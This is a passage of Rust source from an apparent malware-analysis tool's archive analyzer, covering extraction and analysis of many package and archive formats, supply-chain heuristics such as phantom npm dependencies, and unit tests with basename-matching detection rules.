    ///
    /// This method uses the streaming infrastructure to extract and analyze files
    /// concurrently, calling the provided callback for each file as it completes.
    ///
    /// # Arguments
    /// * `file_path` - Path to the archive
    /// * `on_file` - Callback invoked for each analyzed file
    ///
    /// # Returns
    /// The full `AnalysisReport` with aggregated results
    #[allow(dead_code)] // Used by binary target
    pub(crate) fn analyze_streaming<F>(
        &self,
        file_path: &Path,
        on_file: F,
    ) -> Result<AnalysisReport>
    where
        F: Fn(&FileAnalysis) + Send + Sync,
    {
        tracing::debug!(
            path = %file_path.display(),
            "analyze_streaming() now delegates to the unified archive analysis path"
        );
        let mut report = self.analyze_archive(file_path)?;
        for file in &report.files {
            on_file(file);
        }
        if report.summary.is_none() {
            let mut counts = FindingCounts::default();
            let mut score = 0.0_f32;
            for file in &report.files {
                if let Some(file_counts) = &file.counts {
                    counts.hostile += file_counts.hostile;
                    counts.suspicious += file_counts.suspicious;
                    counts.notable += file_counts.notable;
                }
                score += file.score as f32;
            }
            report.summary = Some(ReportSummary {
                files_analyzed: report.files.len() as u32,
                counts,
                score: score.ceil() as u32,
                ..Default::default()
            });
        }
        Ok(report)
    }

    /// Analyze an extracted directory as if it were an archive.
    ///
    /// This bypasses the extraction step and proceeds directly to analyzing the
    /// contents of the directory.
    pub(crate) fn analyze_extracted_directory(
        &self,
        dir_path: &Path,
        original_file_path: &Path,
    ) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        if self.is_cancelled() {
            anyhow::bail!("Analysis cancelled before directory analysis");
        }

        let target = TargetInfo {
            path: original_file_path.display().to_string(),
            file_type: "directory".to_string(),
            size_bytes: 0,
            sha256: String::new(),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature for the directory analysis
        report.structure.push(StructuralFeature {
            id: "archive/directory".to_string(),
            desc: "Extracted directory analysis".to_string(),
            evidence: vec![Evidence {
                method: "sfx_optimization".to_string(),
                source: "archive_analyzer".to_string(),
                value: "bypassed_tar_step".to_string(),
                location: None,
                ..Default::default()
            }],
        });

        // Proceed to analyze the directory contents (SFX installers are analyzed as generic archives)
        self.analyze_generic_archive(dir_path, &mut report, start);

        Ok(report)
    }

    /// Analyze a PyInstaller-bundled executable from in-memory bytes.
    ///
    /// Decodes every CArchive entry and PYZ content, then runs the same
    /// per-member analysis pipeline used for ZIP archives — without
    /// touching the disk.
    pub(crate) fn analyze_pyinstaller_bytes(
        &self,
        data: &[u8],
        archive_path: &Path,
    ) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();
        if self.is_cancelled() {
            anyhow::bail!("Analysis cancelled before PyInstaller analysis");
        }
        let target = TargetInfo {
            path: archive_path.display().to_string(),
            file_type: "pe".to_string(),
            size_bytes: data.len() as u64,
            sha256: calculate_sha256(data),
            architectures: None,
        };
        let mut report = AnalysisReport::new(target);
        report.structure.push(StructuralFeature {
            id: "archive/pyinstaller".to_string(),
            desc: "PyInstaller-bundled Python executable".to_string(),
            evidence: vec![Evidence {
                method: "marker_detection".to_string(),
                source: "pyinstx".to_string(),
                value: "MEI cookie".to_string(),
                location: None,
                ..Default::default()
            }],
        });
        self.analyze_pyinstaller_archive_in_memory(data, archive_path, &mut report, start)?;
        Ok(report)
    }

    fn analyze_archive(&self, file_path: &Path) -> Result<AnalysisReport> {
        let data = fs::read(file_path)?;
        self.analyze_archive_with_data(&data, file_path)
    }

    /// Core archive analysis logic operating on already-loaded data.
    ///
    /// `archive_path` carries the original filename for type detection and
    /// reporting; the actual bytes come from `data`.
    pub(super) fn analyze_archive_with_data(
        &self,
        data: &[u8],
        archive_path: &Path,
    ) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        if self.current_depth >= self.max_depth {
            anyhow::bail!("Maximum archive depth ({}) exceeded", self.max_depth);
        }

        if self.is_cancelled() {
            anyhow::bail!("Analysis cancelled before archive extraction");
        }

        let guard = ExtractionGuard::with_cancellation(self.cancelled.clone());
        let file_type = crate::analyzers::detect_file_type_from_data(archive_path, data);
        let archive_type_str = file_type.report_file_type();

        let target = TargetInfo {
            path: archive_path.display().to_string(),
            file_type: archive_type_str.clone(),
            size_bytes: data.len() as u64,
            sha256: calculate_sha256(data),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);
        let mut filefacts_archive_entries: Vec<ArchiveEntry> = Vec::new();

        // Open filefacts once on the host archive bytes and merge its
        // typed values/metrics into the report. The capability
        // mapper's `evaluate_and_merge_findings_with_precomputed`
        // does this for PE/ELF/Mach-O but archives evaluate via
        // `evaluate_container_findings`, which doesn't go through
        // that path — so we plumb the merge in here. This is what
        // makes `chm.itsf.*` / `rpm.*` / `crx.*` etc. reachable via
        // both `report.values_tree` (host-level kv) and
        // `report.filefacts_metrics` (host-level metrics).
        if let Ok(ctx) = crate::analysis_context::AnalysisContext::open(archive_path, data) {
            report.filefacts = Some(crate::types::FilefactsView::from_ctx(&ctx));
            report.identity = ctx.identity();
            filefacts_archive_entries = ctx.archive_entries();
            crate::capabilities::merge_filefacts_context(&mut report, &ctx);
        }

        // Seed the member list from filefacts. For an image this is the only
        // complete view of what it holds: a member cleave cannot identify is
        // dropped from the report, so a name-matching rule would never see the
        // lure that named it. The extraction pass merges its own per-member
        // metadata onto these entries by path rather than appending duplicates.
        if is_zip_container(file_type) || matches!(file_type, FileType::Iso) {
            report.archive_contents.extend(
                filefacts_archive_entries
                    .iter()
                    .filter(|entry| entry.entry_type.as_deref() != Some("directory"))
                    .cloned(),
            );
        }

        if matches!(file_type, FileType::Chm) {
            self.analyze_chm_archive_in_memory(data, archive_path, &mut report, start, &guard)?;
            drain_extraction_notes(&mut report, &guard);
            let hostile_reasons = guard.take_reasons();
            let suppress_path_traversal =
                should_suppress_path_traversal_findings(archive_path, &hostile_reasons);
            push_archive_hostile_findings(
                &mut report,
                hostile_reasons,
                archive_path,
                "archive_analyzer",
                suppress_path_traversal,
            );
            report.structure.push(StructuralFeature {
                id: format!("archive/{}", archive_type_str),
                desc: format!("{} archive", archive_type_str),
                evidence: vec![Evidence {
                    method: "extension".to_string(),
                    source: "archive_analyzer".to_string(),
                    value: archive_path
                        .extension()
                        .and_then(|e| e.to_str())
                        .unwrap_or("unknown")
                        .to_string(),
                    location: None,
                    ..Default::default()
                }],
            });
            report.seal_archive_metadata_kv();
            self.evaluate_container_findings(&mut report, data);
            return Ok(report);
        }

        if matches!(file_type, FileType::Asar) {
            self.analyze_asar_archive_in_memory(data, archive_path, &mut report, start, &guard)?;
            let member_metadata = guard.take_member_metadata();
            if !member_metadata.is_empty() {
                merge_archive_member_metadata(&mut report, member_metadata);
            }
            drain_extraction_notes(&mut report, &guard);
            let hostile_reasons = guard.take_reasons();
            let suppress_path_traversal =
                should_suppress_path_traversal_findings(archive_path, &hostile_reasons);
            push_archive_hostile_findings(
                &mut report,
                hostile_reasons,
                archive_path,
                "archive_analyzer",
                suppress_path_traversal,
            );
            report.structure.push(StructuralFeature {
                id: format!("archive/{}", archive_type_str),
                desc: format!("{} archive", archive_type_str),
                evidence: vec![Evidence {
                    method: "extension".to_string(),
                    source: "archive_analyzer".to_string(),
                    value: archive_path
                        .extension()
                        .and_then(|e| e.to_str())
                        .unwrap_or("unknown")
                        .to_string(),
                    location: None,
                    ..Default::default()
                }],
            });
            report.seal_archive_metadata_kv();
            self.evaluate_container_findings(&mut report, data);
            return Ok(report);
        }

        let archive_fits_memory = data.len() as u64 <= self.max_memory_file_size;
        let zip_family_in_memory = is_zip_container(file_type)
            && archive_fits_memory
            && !filefacts_archive_entries
                .iter()
                .any(|entry| entry.encrypted);
        if zip_family_in_memory {
            if matches!(file_type, FileType::Crx) {
                let zip_offset = zip::crx_zip_offset(data)?;
                self.analyze_zip_archive_in_memory(
                    &data[zip_offset..],
                    archive_path,
                    &mut report,
                    start,
                    &guard,
                    &[],
                )?;
            } else {
                self.analyze_zip_archive_in_memory(
                    data,
                    archive_path,
                    &mut report,
                    start,
                    &guard,
                    &filefacts_archive_entries,
                )?;
            }
            let member_metadata = guard.take_member_metadata();
            if !member_metadata.is_empty() {
                merge_archive_member_metadata(&mut report, member_metadata);
            }
            drain_extraction_notes(&mut report, &guard);
            let hostile_reasons = guard.take_reasons();
            let suppress_path_traversal =
                should_suppress_path_traversal_findings(archive_path, &hostile_reasons);
            push_archive_hostile_findings(
                &mut report,
                hostile_reasons,
                archive_path,
                "archive_analyzer",
                suppress_path_traversal,
            );
            report.structure.push(StructuralFeature {
                id: format!("archive/{}", archive_type_str),
                desc: format!("{} archive", archive_type_str),
                evidence: vec![Evidence {
                    method: "extension".to_string(),
                    source: "archive_analyzer".to_string(),
                    value: archive_path
                        .extension()
                        .and_then(|e| e.to_str())
                        .unwrap_or("unknown")
                        .to_string(),
                    location: None,
                    ..Default::default()
                }],
            });
            // Container-level basename + composite evaluation. The
            // temp_dir extraction path runs the equivalent further
            // down; the in-memory short-circuit needs the same pass
            // or composites like `python-package-with-dll` will never
            // see member basenames.
            report.seal_archive_metadata_kv();
            self.evaluate_container_findings(&mut report, data);
            return Ok(report);
        }

        let temp_dir = tempfile::tempdir().context("Failed to create temporary directory")?;
        let extraction_result = self.extract_from_data(
            data,
            archive_path,
            temp_dir.path(),
            &guard,
            &filefacts_archive_entries,
        );

        let hostile_reasons = guard.take_reasons();

        if let Err(e) = extraction_result {
            let mut preserved_7z_metadata = false;
            if matches!(file_type, FileType::SevenZ)
                && let Ok(entries) = system_packages::list_7z_entries_from_file(archive_path)
                && !entries.is_empty()
            {
                report.archive_contents.extend(entries);
                report.metadata.errors.push(format!(
                    "7z extraction failed; preserved encrypted directory metadata: {e}"
                ));
                preserved_7z_metadata = true;
            }
            // An optical-disc image describes itself before it is unpacked:
            // filefacts has already merged the volume descriptors, the
            // namespace comparison, and the unclaimed-space accounting into
            // this report. Erroring out would discard all of it and report
            // nothing at all for the image cleave was least able to read —
            // which is exactly the image worth describing. Degrade to a
            // container-only report instead.
            let preserved_iso_facts = matches!(file_type, FileType::Iso)
                && report
                    .filefacts
                    .as_ref()
                    .is_some_and(|ff| ff.values.get("iso").is_some());
            if preserved_iso_facts {
                report
                    .metadata
                    .errors
                    .push(format!("ISO member extraction failed: {e}"));
            }

            let extracted_count = walkdir::WalkDir::new(temp_dir.path())
                .min_depth(1)
                .into_iter()
                .filter_map(std::result::Result::ok)
                .count();
            if extracted_count > 0 {
                // Extraction stopped early but landed members on disk — those
                // are analyzed below. Record why the rest are missing so a
                // partial unpack is not read as a complete one.
                guard.add_extraction_note(format!(
                    "archive extraction stopped after {extracted_count} entries: {e}"
                ));
            }
            if extracted_count == 0 {
                if preserved_7z_metadata || preserved_iso_facts {
                    drain_extraction_notes(&mut report, &guard);
                    let suppress_path_traversal =
                        should_suppress_path_traversal_findings(archive_path, &hostile_reasons);
                    push_archive_hostile_findings(
                        &mut report,
                        hostile_reasons,
                        archive_path,
                        "archive_analyzer",
                        suppress_path_traversal,
                    );
                    report.structure.push(StructuralFeature {
                        id: format!("archive/{}", archive_type_str),
                        desc: format!("{} archive", archive_type_str),
                        evidence: vec![Evidence {
                            method: "extension".to_string(),
                            source: "archive_analyzer".to_string(),
                            value: archive_path
                                .extension()
                                .and_then(|ext| ext.to_str())
                                .unwrap_or("unknown")
                                .to_string(),
                            location: None,
                            ..Default::default()
                        }],
                    });
                    report.seal_archive_metadata_kv();
                    self.evaluate_container_findings(&mut report, data);
                    return Ok(report);
                }
                return Err(e);
            }
        }

        drain_extraction_notes(&mut report, &guard);

        let suppress_path_traversal =
            should_suppress_path_traversal_findings(archive_path, &hostile_reasons);
        push_archive_hostile_findings(
            &mut report,
            hostile_reasons,
            archive_path,
            "archive_analyzer",
            suppress_path_traversal,
        );

        report.structure.push(StructuralFeature {
            id: format!("archive/{}", archive_type_str),
            desc: format!("{} archive", archive_type_str),
            evidence: vec![Evidence {
                method: "extension".to_string(),
                source: "archive_analyzer".to_string(),
                value: archive_path
                    .extension()
                    .and_then(|e| e.to_str())
                    .unwrap_or("unknown")
                    .to_string(),
                location: None,
                ..Default::default()
            }],
        });

        if self.is_cancelled() {
            anyhow::bail!("Analysis cancelled after archive extraction");
        }

        if is_zip_container(file_type) {
            self.analyze_jar_archive(temp_dir.path(), &mut report, start);
        } else {
            self.analyze_generic_archive(temp_dir.path(), &mut report, start);
        }

        // Drain per-entry forensic metadata captured during extraction and
        // merge it into `report.archive_contents` by archive-relative path.
        // Aggregate kv-tree exposure (`archive.compression.*`,
        // `archive.timing.*`, …) is built later when the report is sealed.
        let member_metadata = guard.take_member_metadata();
        if !member_metadata.is_empty() {
            merge_archive_member_metadata(&mut report, member_metadata);
        }

        let analysis_elapsed = start.elapsed();
        if analysis_elapsed.as_secs() > 60 {
            tracing::warn!(
                path = %archive_path.display(),
                archive_type = %archive_type_str,
                depth = self.current_depth,
                files_in_report = report.files.len(),
                elapsed_secs = analysis_elapsed.as_secs(),
                rayon_thread = ?rayon::current_thread_index(),
                "Slow archive analysis",
            );
        }

        report.seal_archive_metadata_kv();
        self.evaluate_container_findings(&mut report, data);

        Ok(report)
    }

    /// Run container-level basename traits + composite rules and merge
    /// the results into `report.findings`. Shared between the in-memory
    /// and temp_dir analysis paths so both produce the same composites
    /// (e.g. `python-package-with-dll`).
    fn evaluate_container_findings(&self, report: &mut AnalysisReport, archive_data: &[u8]) {
        // Cross-member npm consistency: a runtime dependency declared in
        // package.json that no shipped module imports is a phantom dependency
        // — the install-time-payload shape of a hijacked-publisher release
        // (the package code never references the injected dropper). Computed
        // here, before container composites run, so a `type: metrics` trait can
        // read `consistency.unused_runtime_deps` at archive scope.
        if let Some(count) = compute_unused_runtime_deps(report) {
            report
                .filefacts_metrics
                .get_or_insert_with(Default::default)
                .insert("consistency.unused_runtime_deps".to_string(), count as f64);
        }

        let Some(mapper) = &self.capability_mapper else {
            return;
        };
        let archive_atomic_findings =
            mapper.evaluate_traits_with_ast(report, archive_data, None, None);
        report
            .findings
            .extend(archive_atomic_findings.iter().cloned());

        // Rank by reference, then clone only the survivors. A container's
        // members can carry far more than the 50k cap between them (63k
        // TypeScript members produce several hundred thousand), and cloning
        // every one — evidence vectors included — just to drop 90% of them at
        // the truncate was pure waste in the single-threaded finalize path.
        const MAX_NESTED_FINDINGS: usize = 50_000;
        let mut ranked: Vec<&Finding> = report
            .files
            .iter()
            .flat_map(|f| f.findings.iter())
            .chain(archive_atomic_findings.iter())
            .collect();
        ranked.sort_unstable_by(|a, b| b.crit.cmp(&a.crit).then_with(|| b.conf.total_cmp(&a.conf)));
        ranked.truncate(MAX_NESTED_FINDINGS);
        let mut nested_findings: Vec<Finding> = ranked.into_iter().cloned().collect();

        let entry_names: Vec<String> = report
            .archive_contents
            .iter()
            .map(|e| e.path.clone())
            .collect();
        if !entry_names.is_empty() {
            let basename_findings = mapper.evaluate_basename_traits_for_entries(&entry_names);
            nested_findings.extend(basename_findings);
        }

        let container_findings = mapper.evaluate_container_composites(
            report,
            &nested_findings,
            &report.target.file_type,
        );
        report.findings.extend(container_findings);

        // Cross-scope downgrade pass: per-file findings (in report.files[*])
        // were originally evaluated with only their own file's findings in
        // scope. Now that container composites have been added to
        // report.findings, give every per-file finding a second chance to
        // apply downgrades that reference container-level traits (e.g.
        // `metadata/signed/platform::mozilla-extension`). Pass empty bytes
        // and an empty SectionMap — id-reference conditions don't need them,
        // and re-reading every file's bytes here would be prohibitive.
        let container_file_type = mapper.detect_file_type(&report.target.file_type);
        let empty_section_map = SectionMap::default();
        let container_snapshot: Vec<crate::types::Finding> = report.findings.clone();
        // Re-evaluate downgrades on the container's own findings using the
        // same findings list as extras. This catches container-level
        // composites whose downgrade clauses reference other container-level
        // composites (e.g. `broad-content-injection` referencing
        // `mozilla-extension`) — both fire at this scope but the initial
        // composite eval doesn't re-run downgrades.
        let mut container_findings = std::mem::take(&mut report.findings);
        mapper.reeval_downgrades_cross_scope(
            &mut container_findings,
            &container_snapshot,
            report,
            &[],
            container_file_type,
            &empty_section_map,
        );
        report.findings = container_findings;
        // Detach files so we can pass `report` immutably to the reeval; the
        // reeval evaluator only reads report-level metadata (target.path,
        // values_tree) so this swap is safe.
        let mut files = std::mem::take(&mut report.files);
        // Each file's findings re-evaluate independently against the same
        // immutable container snapshot, so this parallelizes cleanly — on a
        // 13k-member archive the serial loop was a single-threaded tail that
        // ran after all member analysis had finished.
        {
            use rayon::prelude::*;
            files.par_iter_mut().for_each(|file| {
                mapper.reeval_downgrades_cross_scope(
                    &mut file.findings,
                    &container_snapshot,
                    report,
                    &[],
                    container_file_type,
                    &empty_section_map,
                );
                if has_builtin_anti_analysis_finding(&file.findings) {
                    mapper.apply_retroactive_unless_suppression_to_findings(&mut file.findings);
                    if path_is_fixture_context(&file.path) {
                        file.findings
                            .retain(|finding| finding.id != "anti-analysis/archive/symlink-escape");
                    }
                }
            });
        }
        report.files = files;
        if has_builtin_anti_analysis_finding(&report.findings) {
            mapper.apply_retroactive_unless_suppression_to_findings(&mut report.findings);
            let fixture_file_ids: Vec<u32> = report
                .files
                .iter()
                .enumerate()
                .filter_map(|(idx, file)| path_is_fixture_context(&file.path).then_some(idx as u32))
                .collect();
            report.findings.retain(|finding| {
                finding.id != "anti-analysis/archive/symlink-escape"
                    || !finding
                        .src
                        .is_some_and(|src| fixture_file_ids.contains(&src))
            });
        }
    }

    /// Extract an archive from in-memory data into `dest_dir`.
    ///
    /// Uses `Cursor<&[u8]>` for all pure-Rust formats so no temporary file is
    /// needed.  RAR (which delegates to the native unrar library) still writes
    /// a temporary file, preserving the `.rar` extension so the library can
    /// identify the format.
    fn extract_from_data(
        &self,
        data: &[u8],
        archive_path: &Path,
        dest_dir: &Path,
        guard: &ExtractionGuard,
        filefacts_members: &[ArchiveEntry],
    ) -> Result<()> {
        use std::io::Cursor;

        let file_type = crate::analyzers::detect_file_type_from_data(archive_path, data);

        // RAR requires a real file path (native unrar library limitation).
        if matches!(file_type, FileType::Rar) {
            let temp = tempfile::Builder::new().suffix(".rar").tempfile()?;
            std::fs::write(temp.path(), data)?;
            return system_packages::extract_rar(temp.path(), dest_dir, guard);
        }

        match file_type {
            // A gem is an uncompressed `ustar` tar (members: metadata.gz,
            // data.tar.gz, checksums.yaml.gz); recursion descends into
            // data.tar.gz for the installed files.
            FileType::Tar | FileType::Gem | FileType::OciImage | FileType::GentooBinpkg => {
                tar::extract_tar_entries_safe(Cursor::new(data), dest_dir, guard)
            }
            // Alpine/Wolfi `.apk`: several gzip streams concatenated (control +
            // data segments), not a single gzip-tar. Walk every segment so the
            // data segment's members — the installed ELF binaries — are analyzed.
            FileType::ApkAlpine => {
                system_packages::extract_apk_alpine_from_data(data, dest_dir, guard)
            }
            // Gzip-tar packages: npm `.tgz`, Rust `.crate`, Python sdist
            // `.tar.gz` — a single gzip stream wrapping a single tar; recursion
            // analyzes their members (package.json, Cargo.toml, setup.py /
            // PKG-INFO, installed files). filefacts only labels a gzip-tar as an
            // sdist when it carries a `PKG-INFO` root, so this arm is always a
            // gzip tarball.
            FileType::TarGz | FileType::Npm | FileType::Crate | FileType::PythonSdist => {
                tar::extract_tar_entries_safe(
                    flate2::read::GzDecoder::new(Cursor::new(data)),
                    dest_dir,
                    guard,
                )
            }
            FileType::TarBz2 => tar::extract_tar_entries_safe(
                bzip2::read::BzDecoder::new(Cursor::new(data)),
                dest_dir,
                guard,
            ),
            FileType::TarXz => tar::extract_tar_entries_safe(
                xz2::read::XzDecoder::new(Cursor::new(data)),
                dest_dir,
                guard,
            ),
            // zstd-tar packages: generic `.tar.zst`, Arch and FreeBSD `.pkg*`.
            FileType::TarZst | FileType::PkgArch | FileType::PkgFreebsd | FileType::Xbps => {
                tar::extract_tar_entries_safe(
                    zstd::stream::read::Decoder::new(Cursor::new(data))
                        .context("Failed to create zstd decoder")?,
                    dest_dir,
                    guard,
                )
            }
            FileType::Gz => decompress_to_file(
                flate2::read::GzDecoder::new(Cursor::new(data)),
                archive_path,
                dest_dir,
                data.len() as u64,
                guard,
            ),
            FileType::Bz2 => decompress_to_file(
                bzip2::read::BzDecoder::new(Cursor::new(data)),
                archive_path,
                dest_dir,
                data.len() as u64,
                guard,
            ),
            FileType::Xz => decompress_to_file(
                xz2::read::XzDecoder::new(Cursor::new(data)),
                archive_path,
                dest_dir,
                data.len() as u64,
                guard,
            ),
            FileType::Zst => decompress_to_file(
                zstd::stream::read::Decoder::new(Cursor::new(data))
                    .context("Failed to create zstd decoder")?,
                archive_path,
                dest_dir,
                data.len() as u64,
                guard,
            ),
            // Zip-based packages: Android apk, conda, egg, nupkg, ipa, vsix —
            // same extraction as the other zip family.
            FileType::Zip
            | FileType::Jar
            | FileType::Whl
            | FileType::Xpi
            | FileType::ApkAndroid
            | FileType::Conda
            | FileType::Egg
            | FileType::Nupkg
            | FileType::Ipa
            | FileType::Vsix => {
                zip::extract_zip_from_data(data, dest_dir, guard, &self.zip_passwords)
            }
            FileType::Crx => zip::extract_crx_from_data(data, dest_dir, guard),
            FileType::Deb => {
                system_packages::extract_deb_from_reader(Cursor::new(data), dest_dir, guard)
            }
            FileType::Rpm => {
                system_packages::extract_rpm_from_reader(Cursor::new(data), dest_dir, guard)
            }
            FileType::SevenZ => {
                system_packages::extract_7z_from_data(data, dest_dir, guard, &self.zip_passwords)
            }
            // Optical-disc image. Members are uncompressed sector runs, so
            // extraction copies the extents filefacts already located while
            // reading the ISO 9660 / UDF directory tree — no decoder, and no
            // second parse of the image.
            FileType::Iso => iso::extract_iso_from_data(data, filefacts_members, dest_dir, guard),
            FileType::PkgMacos => system_packages::extract_pkg_from_reader(
                Cursor::new(data),
                data.len() as u64,
                dest_dir,
                guard,
            ),
            FileType::Cab => {
                system_packages::extract_cab_from_reader(Cursor::new(data), dest_dir, guard)
            }
            // Apple disk image: 7-Zip unpacks HFS+ to a file tree and recovers
            // the embedded Mach-O from APFS images. The host-level `dmg.*`
            // facts come from filefacts regardless of what 7-Zip can extract.
            FileType::Dmg => system_packages::extract_dmg_from_data(data, dest_dir, guard),
            _ => anyhow::bail!("Unsupported archive type: {:?}", file_type),
        }
    }
}

impl Default for ArchiveAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}
impl Analyzer for ArchiveAnalyzer {
    fn analyze_input(&self, input: &AnalysisInput<'_>) -> Result<AnalysisReport> {
        if input.path.exists() {
            // File is already on disk — read it once and analyse in-memory.
            let data = fs::read(input.path)?;
            self.analyze_archive_with_data(&data, input.path)
        } else {
            // Data arrived in-memory (e.g. via analyze_bytes or a nested archive).
            self.analyze_archive_with_data(input.data, input.path)
        }
    }

    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        self.analyze_archive(file_path)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        crate::analyzers::detect_file_type(file_path)
            .map(|ft| ft.is_archive())
            .unwrap_or(false)
    }
}

/// Merge per-entry forensic metadata captured by [`ExtractionGuard`] during
/// extraction into the matching `ArchiveEntry` items in `report.archive_contents`.
///
/// Matching strategy: exact match on `archive_path` first (top-level archives),
/// then fall back to the suffix after the last `!` (nested archives, where
/// `ArchiveEntry.path` is `parent.zip!inner/path`). Only optional fields that
/// are still `None` are populated — never overwrite values already set by the
/// caller. Entries in the metadata vec that don't match any `ArchiveEntry`
/// (e.g. directories or symlinks not surfaced in `archive_contents`) are
/// dropped silently; aggregate kv exposure will capture them in a later pass.
fn merge_archive_member_metadata(
    report: &mut AnalysisReport,
    metadata: Vec<ExtractedMemberMetadata>,
) {
    use std::collections::HashMap;

    let mut by_path: HashMap<String, ExtractedMemberMetadata> = metadata
        .into_iter()
        .map(|m| (m.archive_path.clone(), m))
        .collect();

    for entry in &mut report.archive_contents {
        let key = if by_path.contains_key(&entry.path) {
            Some(entry.path.clone())
        } else {
            entry
                .path
                .rsplit('!')
                .next()
                .filter(|s| by_path.contains_key(*s))
                .map(ToString::to_string)
        };
        let Some(key) = key else { continue };
        let Some(meta) = by_path.remove(&key) else {
            continue;
        };

        if entry.compressed_size.is_none() {
            entry.compressed_size = meta.compressed_size;
        }
        if entry.compression_method.is_none() {
            entry.compression_method = meta.compression_method;
        }
        if entry.mtime_unix.is_none() {
            entry.mtime_unix = meta.mtime_unix;
        }
        if entry.mode_octal.is_none() {
            entry.mode_octal = meta.mode_octal;
        }
        if entry.uid.is_none() {
            entry.uid = meta.uid;
        }
        if entry.gid.is_none() {
            entry.gid = meta.gid;
        }
        if entry.uname.is_none() {
            entry.uname = meta.uname;
        }
        if entry.gname.is_none() {
            entry.gname = meta.gname;
        }
        if entry.entry_type.is_none() {
            entry.entry_type = meta.entry_type;
        }
        if entry.linkname.is_none() {
            entry.linkname = meta.linkname;
        }
        if entry.host_os.is_none() {
            entry.host_os = meta.host_os;
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use guards::{ExtractionGuard, MAX_FILE_COUNT, sanitize_entry_path};
    use std::fs::File;
    use std::io::{Cursor, Write};

    // Import external crate types (our modules shadow these names)
    use ::tar;
    use ::zip;

    fn pkg_json_member(deps: &[&str]) -> FileAnalysis {
        let mut f = FileAnalysis::new(
            0,
            "package/package.json".into(),
            "package.json".into(),
            String::new(),
            0,
        );
        for d in deps {
            f.kv.insert(
                format!("dependencies.{d}"),
                serde_json::Value::String("^1.0.0".into()),
            );
        }
        f
    }

    fn code_member(specifiers: &[&str]) -> FileAnalysis {
        let mut f = FileAnalysis::new(
            1,
            "package/dist/index.js".into(),
            "javascript".into(),
            String::new(),
            0,
        );
        f.imports = specifiers
            .iter()
            .map(|s| crate::types::Import::new(*s, None))
            .collect();
        f
    }

    fn report_with(files: Vec<FileAnalysis>) -> AnalysisReport {
        let mut r = AnalysisReport::new(TargetInfo::default());
        r.files = files;
        r
    }

    #[test]
    fn phantom_dep_counts_unimported_runtime_dep() {
        // @turbopuffer is imported (incl. a subpath); easy-day-js is declared
        // but never imported → exactly one phantom.
        let report = report_with(vec![
            pkg_json_member(&["@turbopuffer/turbopuffer", "easy-day-js"]),
            code_member(&["@turbopuffer/turbopuffer/resources/custom", "node:crypto"]),
        ]);
        assert_eq!(compute_unused_runtime_deps(&report), Some(1));
    }

    #[test]
    fn phantom_dep_zero_when_all_imported() {
        let report = report_with(vec![
            pkg_json_member(&["dayjs"]),
            code_member(&["dayjs/plugin/utc"]),
        ]);
        assert_eq!(compute_unused_runtime_deps(&report), Some(0));
    }

    #[test]
    fn phantom_dep_ignores_manifest_self_reported_imports() {
        // The manifest member also carries its declared deps as `imports`
        // (engine surfaces them for `type: import`); those must not count as
        // real usage, or every dep would look used.
        let mut manifest = pkg_json_member(&["easy-day-js"]);
        manifest.imports = vec![crate::types::Import::new("easy-day-js", None)];
        let report = report_with(vec![manifest, code_member(&["@turbopuffer/turbopuffer"])]);
        assert_eq!(compute_unused_runtime_deps(&report), Some(1));
    }

    #[test]
    fn phantom_dep_none_without_imports() {
        // No code imports observed → cannot conclude; emit nothing.
        let report = report_with(vec![pkg_json_member(&["easy-day-js"])]);
        assert_eq!(compute_unused_runtime_deps(&report), None);
    }

    #[test]
    fn phantom_dep_none_without_manifest() {
        let report = report_with(vec![code_member(&["dayjs"])]);
        assert_eq!(compute_unused_runtime_deps(&report), None);
    }

    fn write_test_traits(yaml: &str) -> tempfile::NamedTempFile {
        let mut file = tempfile::NamedTempFile::new().expect("create temp yaml");
        file.write_all(yaml.as_bytes()).expect("write temp yaml");
        file
    }

    fn make_archive_test_mapper() -> crate::capabilities::CapabilityMapper {
        let yaml = r#"
defaults:
  for: [all]
  platforms: [unix, windows, macos]

traits:
  - id: "test/archive::package-json-basename"
    desc: "package.json basename"
    crit: baseline
    if:
      type: basename
      exact: "package.json"

  - id: "test/archive::setup-py-basename"
    desc: "setup.py basename"
    crit: baseline
    if:
      type: basename
      exact: "setup.py"

  - id: "test/archive::exe-extension-basename"
    desc: "exe basename"
    crit: notable
    if:
      type: basename
      regex: "\\.exe$"

  - id: "test/archive::dll-extension-basename"
    desc: "dll basename"
    crit: notable
    if:
      type: basename
      regex: "\\.dll$"

  - id: "test/archive::png-extension-basename"
    desc: "png basename"
    crit: notable
    if:
      type: basename
      regex: "\\.png$"

composite_rules:
  - id: "test/supply-chain::npm-package-with-exe"
    desc: "NPM package with embedded exe"
    crit: suspicious
    all:
      - id: "test/archive::package-json-basename"
      - id: "test/archive::exe-extension-basename"

  - id: "test/supply-chain::python-package-with-dll"
    desc: "Python package with embedded dll"
    crit: suspicious
    all:
      - id: "test/archive::setup-py-basename"
      - id: "test/archive::dll-extension-basename"

  - id: "test/supply-chain::npm-package-with-image"
    desc: "NPM package with embedded image"
    crit: notable
    all:
      - id: "test/archive::package-json-basename"
      - id: "test/archive::png-extension-basename"
"#;
        let file = write_test_traits(yaml);
        crate::capabilities::CapabilityMapper::from_yaml(file.path()).expect("load archive mapper")
    }

    #[test]
    fn test_new() {
        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        assert_eq!(analyzer.max_depth, 3);
        assert_eq!(analyzer.current_depth, 0);
    }

    #[test]
    fn test_default() {
        let analyzer = ArchiveAnalyzer::default();
        assert_eq!(analyzer.max_depth, 3);
        assert_eq!(analyzer.current_depth, 0);
    }

    #[test]
    fn test_with_depth() {
        let analyzer = ArchiveAnalyzer::new().with_depth(5);
        assert_eq!(analyzer.current_depth, 5);
    }

    #[test]
    fn archive_analyzer_config_applies_extract_dir_options() {
        let extract_dir = tempfile::tempdir().expect("create extract dir");
        let options = crate::AnalysisOptions {
            all_files: true,
            max_memory_file_size: 42,
            sample_extraction: Some(SampleExtractionConfig::new(
                extract_dir.path().to_path_buf(),
            )),
            ..crate::AnalysisOptions::default()
        };

        let analyzer =
